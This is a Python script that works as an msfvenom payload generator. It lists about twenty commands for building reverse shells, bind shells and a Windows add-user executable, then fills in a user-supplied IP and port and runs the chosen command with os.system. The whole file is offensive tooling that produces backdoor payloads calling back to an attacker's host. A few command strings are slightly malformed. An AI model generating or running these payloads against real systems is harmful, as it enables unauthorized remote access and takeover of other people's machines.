#!/usr/bin/python3

import os

payloads = [
	['Linux Meterpreter reverse shell x86 multi stage', 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf'],
	['Linux Meterpreter bind shell x86 multi stage', 'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf'],
	['Linux bind shell x64 single stage', 'msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf'],
	['Linux reverse shell x64 single stage', 'msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf'],
	['Windows Meterpreter reverse shell', 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe'],
	['Windows Meterpreter http reverse shell', 'msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe'],
	['Windows Meterpreter bind shell', 'msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe'],
	['Windows CMD Multi Stage', 'msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe'],
	['Windows CMD Single Stage', 'msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe'],
	['Windows add user', 'msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe'],
	['Mac Reverse Shell', 'msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho'],
	['Mac Bind shell', 'msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho'],
	['Python Shell', 'msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py'],
	['BASH Shell', 'msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh'],
	['PERL Shell', 'msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl'],
	['ASP Meterpreter shell', 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp'],
	['JSP Shell', 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp'],
	['WAR Shell', 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war'],
	['Php Meterpreter Shell', 'msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php'],
	['Php Reverse Shell', 'msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php'],
]


print("MSF Venom Reverse Shell Generator")
print("Commands from: https://github.com/frizb/MSF-Venom-Cheatsheet")


for i in range(0, len(payloads)):
	print(f"{i}) {payloads[i][0]}\n\t$ {payloads[i][1]}")

number = int(input('\nEnter payload number: '))
ip_addr = input('Enter IP: ')
port = input('Enter PORT: ')
command = payloads[number][1].replace("IP", ip_addr).replace("=PORT", '='+port)
print('$', command)
os.system(command)
